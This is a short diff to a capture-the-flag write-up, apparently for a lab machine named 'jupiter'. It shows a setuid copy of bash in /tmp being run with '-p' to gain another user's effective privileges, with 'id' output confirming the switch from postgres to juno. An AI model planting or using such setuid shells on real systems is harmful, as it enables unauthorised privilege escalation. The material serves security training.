@@ -459,8 +459,8 @@ Go to `/tmp` and execute de malicious bash:
 postgres@jupiter:/tmp$ ls -l malicious_bash 
 -rwsr-sr-x 1 juno juno 1396520 Mar 27 19:50 malicious_bash
 postgres@jupiter:/tmp$ ./malicious_bash -p
-malicious_bash-5.1$ whoami
-juno
+malicious_bash-5.1$ id
+uid=114(postgres) gid=120(postgres) euid=1000(juno) egid=1000(juno) groups=1000(juno),119(ssl-cert),120(postgres)
 ```
 
 <br />
@@ -488,6 +488,8 @@ Welcome to Ubuntu 22.04.2 LTS (GNU/Linux 5.15.0-72-generic x86_64)
 juno@jupiter:~$ id
 uid=1000(juno) gid=1000(juno) groups=1000(juno),1001(science)
 ```
+
+<br />
 
 Now we have the science group.
 
